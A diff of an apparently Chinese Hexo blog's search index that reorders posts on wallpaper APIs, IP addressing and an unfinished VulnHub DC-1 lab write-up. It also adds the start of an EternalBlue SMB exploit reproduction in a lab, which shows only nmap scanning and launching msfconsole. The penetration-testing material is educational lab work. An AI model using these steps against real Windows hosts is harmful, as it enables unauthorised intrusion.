@@ -183,6 +183,132 @@
       </tags>
   </entry>
   <entry>
+    <title>随机背景API接口整理</title>
+    <url>/2022/03/20/backgroundAPI/</url>
+    <content><![CDATA[<h1 id="废话不多说，上图！（每次刷新都不一样哦-）"><a href="#废话不多说，上图！（每次刷新都不一样哦-）" class="headerlink" title="废话不多说，上图！（每次刷新都不一样哦~）"></a>废话不多说，上图！（每次刷新都不一样哦~）</h1><p>（API链接在后面）</p>
+<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
+<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
+<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
+<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
+<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
+<h1 id="API接口链接"><a href="#API接口链接" class="headerlink" title="API接口链接"></a>API接口链接</h1><h2 id="必应壁纸"><a href="#必应壁纸" class="headerlink" title="必应壁纸"></a>必应壁纸</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
+<center>今日必应壁纸</center>
+
+
+
+<h2 id="野生动漫-API"><a href="#野生动漫-API" class="headerlink" title="野生动漫 API"></a>野生动漫 API</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="系列-API（需自己按照网站说明调用-API-参数）"><a href="#系列-API（需自己按照网站说明调用-API-参数）" class="headerlink" title="系列 API（需自己按照网站说明调用 API 参数）"></a>系列 API（需自己按照网站说明调用 API 参数）</h2><blockquote>
+<p>小歪 API</p>
+<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
+<p>未知名称动漫 API</p>
+<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
+<p>樱花 API</p>
+<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
+<p>岁月小筑随机背景 API</p>
+<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
+<p>保罗 API</p>
+<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
+<p>樱道随机图片</p>
+<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
+<p>墨天逸</p>
+<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
+<p>Unsplash</p>
+<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
+<p>后宫漫图：</p>
+<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
+<p>EEEDOG</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+<p>东方 Project</p>
+<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
+<p>搏天 API</p>
+<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
+<p>汐岑 ACG</p>
+<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
+<p>凌一 API</p>
+<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
+<p>Lorem Picsum</p>
+<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
+<p>API 接口文档 - 夏沫博客</p>
+<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
+<p>Ushio API</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+<p>点滴 API</p>
+<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
+<p>Langford’s API</p>
+<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
+<p>一铭 API</p>
+<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
+<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
+<p>R0A1NG’s API<br><a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
+<p>JacksonXE の API<br><a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
+</blockquote>
+<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>IP地址详解</title>
+    <url>/2022/03/17/cgrona1/</url>
+    <content><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="0x02-子网掩码"><a href="#0x02-子网掩码" class="headerlink" title="0x02 子网掩码"></a>0x02 子网掩码</h1><ol>
+<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
+<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
+<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
+</ol>
+<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="0x03-IP地址详解"><a href="#0x03-IP地址详解" class="headerlink" title="0x03 IP地址详解"></a>0x03 IP地址详解</h1><p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
+<ul>
+<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
+<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
+<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
+<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
+<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
+</ul>
+<p>注：</p>
+<p>1、目前我们可以使用的只有A、B、C 三类</p>
+<p>2、A、B、C 三类的子网掩码可以修改</p>
+<h2 id="3-1-127开头"><a href="#3-1-127开头" class="headerlink" title="3.1 127开头"></a>3.1 127开头</h2><p>这个开头只有一个地址：<strong>127.0.0.1：</strong>本地回环地址（永远代表自己）</p>
+<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
+<h2 id="3-2-广播地址"><a href="#3-2-广播地址" class="headerlink" title="3.2 广播地址"></a>3.2 广播地址</h2><p>主机位上全为255即为广播地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="0x04-网关"><a href="#0x04-网关" class="headerlink" title="0x04 网关"></a>0x04 网关</h1><p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
+<p>通俗来讲就是访问互联网的通道</p>
+<p>路由器：可用连接内外网的设备</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="0x05-DNS"><a href="#0x05-DNS" class="headerlink" title="0x05 DNS"></a>0x05 DNS</h1><p>DNS：Domain Name Service 域名服务</p>
+<p>用于<strong>解析网站域名</strong></p>
+<p>通过浏览器使用域名访问互联网：</p>
+<ul>
+<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
+<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
+<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
+</ul>
+<p>若直接访问 IP 地址的话则不需要DNS服务</p>
+<p>通过命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
+<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
+<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
+<h1 id="0x06-网络测试命令"><a href="#0x06-网络测试命令" class="headerlink" title="0x06 网络测试命令"></a>0x06 网络测试命令</h1><ul>
+<li><p>如何查看IP地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>测试网络连通性</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>转载</category>
+      </categories>
+  </entry>
+  <entry>
     <title>My Awesome Photoblog靶机学习记录</title>
     <url>/2022/08/08/Photoblog/</url>
     <content><![CDATA[<h1 id="关于靶机"><a href="#关于靶机" class="headerlink" title="关于靶机"></a>关于靶机</h1><blockquote>
@@ -343,61 +469,60 @@
       </tags>
   </entry>
   <entry>
-    <title>IP地址详解</title>
-    <url>/2022/03/17/cgrona1/</url>
-    <content><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
-<h1 id="0x02-子网掩码"><a href="#0x02-子网掩码" class="headerlink" title="0x02 子网掩码"></a>0x02 子网掩码</h1><ol>
-<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
-<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
-<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
-</ol>
-<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
-<h1 id="0x03-IP地址详解"><a href="#0x03-IP地址详解" class="headerlink" title="0x03 IP地址详解"></a>0x03 IP地址详解</h1><p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
-<ul>
-<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
-<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
-<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
-<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
-<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
-</ul>
-<p>注：</p>
-<p>1、目前我们可以使用的只有A、B、C 三类</p>
-<p>2、A、B、C 三类的子网掩码可以修改</p>
-<h2 id="3-1-127开头"><a href="#3-1-127开头" class="headerlink" title="3.1 127开头"></a>3.1 127开头</h2><p>这个开头只有一个地址：<strong>127.0.0.1：</strong>本地回环地址（永远代表自己）</p>
-<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
-<h2 id="3-2-广播地址"><a href="#3-2-广播地址" class="headerlink" title="3.2 广播地址"></a>3.2 广播地址</h2><p>主机位上全为255即为广播地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
-<h1 id="0x04-网关"><a href="#0x04-网关" class="headerlink" title="0x04 网关"></a>0x04 网关</h1><p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
-<p>通俗来讲就是访问互联网的通道</p>
-<p>路由器：可用连接内外网的设备</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
-<h1 id="0x05-DNS"><a href="#0x05-DNS" class="headerlink" title="0x05 DNS"></a>0x05 DNS</h1><p>DNS：Domain Name Service 域名服务</p>
-<p>用于<strong>解析网站域名</strong></p>
-<p>通过浏览器使用域名访问互联网：</p>
-<ul>
-<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
-<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
-<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
-</ul>
-<p>若直接访问 IP 地址的话则不需要DNS服务</p>
-<p>通过命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
-<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
-<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
-<h1 id="0x06-网络测试命令"><a href="#0x06-网络测试命令" class="headerlink" title="0x06 网络测试命令"></a>0x06 网络测试命令</h1><ul>
-<li><p>如何查看IP地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><p>测试网络连通性</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ul>
+    <title>VulnHub——DC-1靶机学习记录</title>
+    <url>/2022/09/24/dc1/</url>
+    <content><![CDATA[<h1 id="关于DC-1"><a href="#关于DC-1" class="headerlink" title="关于DC-1"></a>关于DC-1</h1><blockquote>
+<p>DC-1是一个专门建造的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
+<p>它的设计对初学者来说是一个挑战，但它的容易程度将取决于你的技能和知识，以及你的学习能力。</p>
+<p>要成功完成此挑战，您需要Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或鹦鹉安全操作系统上找到的工具。</p>
+<p>有多种方法可以获得root，但是，我提供了一些包含初学者线索的标志。</p>
+<p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要成为root才能执行此操作，但是，您将需要root权限。</p>
+<p>根据您的技能水平，您可以跳过查找大多数这些标志并直接进入root。</p>
+<p>初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获取完成此挑战所需的信息所需的全部内容。</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>DC- 1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>发布日期</td>
+<td>2019年2月28日</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>DCAU</td>
+</tr>
+<tr>
+<td>系列</td>
+<td>DC</td>
+</tr>
+<tr>
+<td>网页</td>
+<td><a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机：DC-1（IP:192.168.）</p>
+<p>攻击机：KALI（IP:192.168.3.96）</p>
+<p>平台：VMware 16.2.4</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
+<p><code>arp-scan -l</code></p>
+<hr>
+<p>待更新</p>
 ]]></content>
       <categories>
-        <category>转载</category>
+        <category>学习笔记</category>
       </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>VulnHub——DC-4靶机学习记录</title>
@@ -537,148 +662,6 @@
       </tags>
   </entry>
   <entry>
-    <title>VulnHub——DC-1靶机学习记录</title>
-    <url>/2022/09/24/dc1/</url>
-    <content><![CDATA[<h1 id="关于DC-1"><a href="#关于DC-1" class="headerlink" title="关于DC-1"></a>关于DC-1</h1><blockquote>
-<p>DC-1是一个专门建造的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
-<p>它的设计对初学者来说是一个挑战，但它的容易程度将取决于你的技能和知识，以及你的学习能力。</p>
-<p>要成功完成此挑战，您需要Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或鹦鹉安全操作系统上找到的工具。</p>
-<p>有多种方法可以获得root，但是，我提供了一些包含初学者线索的标志。</p>
-<p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要成为root才能执行此操作，但是，您将需要root权限。</p>
-<p>根据您的技能水平，您可以跳过查找大多数这些标志并直接进入root。</p>
-<p>初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获取完成此挑战所需的信息所需的全部内容。</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>DC- 1</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2019年2月28日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>DCAU</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>DC</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></td>
-</tr>
-</tbody>
-</table>
-</div>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机：DC-1（IP:192.168.）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<hr>
-<p>待更新</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机背景API接口整理</title>
-    <url>/2022/03/20/backgroundAPI/</url>
-    <content><![CDATA[<h1 id="废话不多说，上图！（每次刷新都不一样哦-）"><a href="#废话不多说，上图！（每次刷新都不一样哦-）" class="headerlink" title="废话不多说，上图！（每次刷新都不一样哦~）"></a>废话不多说，上图！（每次刷新都不一样哦~）</h1><p>（API链接在后面）</p>
-<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
-<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
-<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
-<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
-<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
-<h1 id="API接口链接"><a href="#API接口链接" class="headerlink" title="API接口链接"></a>API接口链接</h1><h2 id="必应壁纸"><a href="#必应壁纸" class="headerlink" title="必应壁纸"></a>必应壁纸</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
-<center>今日必应壁纸</center>
-
-
-
-<h2 id="野生动漫-API"><a href="#野生动漫-API" class="headerlink" title="野生动漫 API"></a>野生动漫 API</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="系列-API（需自己按照网站说明调用-API-参数）"><a href="#系列-API（需自己按照网站说明调用-API-参数）" class="headerlink" title="系列 API（需自己按照网站说明调用 API 参数）"></a>系列 API（需自己按照网站说明调用 API 参数）</h2><blockquote>
-<p>小歪 API</p>
-<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
-<p>未知名称动漫 API</p>
-<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
-<p>樱花 API</p>
-<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
-<p>岁月小筑随机背景 API</p>
-<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
-<p>保罗 API</p>
-<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
-<p>樱道随机图片</p>
-<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
-<p>墨天逸</p>
-<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
-<p>Unsplash</p>
-<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
-<p>后宫漫图：</p>
-<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
-<p>EEEDOG</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-<p>东方 Project</p>
-<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
-<p>搏天 API</p>
-<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
-<p>汐岑 ACG</p>
-<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
-<p>凌一 API</p>
-<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
-<p>Lorem Picsum</p>
-<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
-<p>API 接口文档 - 夏沫博客</p>
-<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
-<p>Ushio API</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-<p>点滴 API</p>
-<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
-<p>Langford’s API</p>
-<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
-<p>一铭 API</p>
-<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
-<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
-<p>R0A1NG’s API<br><a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
-<p>JacksonXE の API<br><a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
-</blockquote>
-<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>某神奇社团的招新视频~</title>
-    <url>/2022/07/29/ladybug/</url>
-    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
-</div>
-<div align="center" class="aspect-ratio">
-    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
-    </iframe>
-</div>
-]]></content>
-      <categories>
-        <category>视频</category>
-      </categories>
-      <tags>
-        <tag>bilibili</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo操作 &amp; Markdown语法</title>
     <url>/2022/01/13/hexo/</url>
     <content><![CDATA[<h1 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h1><h2 id="进入博客所在目录-右键打开-Git-Bash-Here-创建博文"><a href="#进入博客所在目录-右键打开-Git-Bash-Here-创建博文" class="headerlink" title="进入博客所在目录,右键打开 Git Bash Here,创建博文:"></a>进入博客所在目录,右键打开 Git Bash Here,创建博文:</h2><p><code>hexo new My New Post</code></p>
@@ -797,6 +780,122 @@
       </tags>
   </entry>
   <entry>
+    <title>永恒之蓝漏洞复现</title>
+    <url>/2022/04/21/eternalblue/</url>
+    <content><![CDATA[<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h1 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h1><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h1><p>攻击机：Linux Kali （192.168.8.242）</p>
+<p>靶机：Windows7 x64 （192.168.8.172）</p>
+<h1 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
+<p><img src="https://img.anineg.space/1.png" alt="1"></p>
+<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
+<h2 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h2><p>执行<code>msfconsole</code></p>
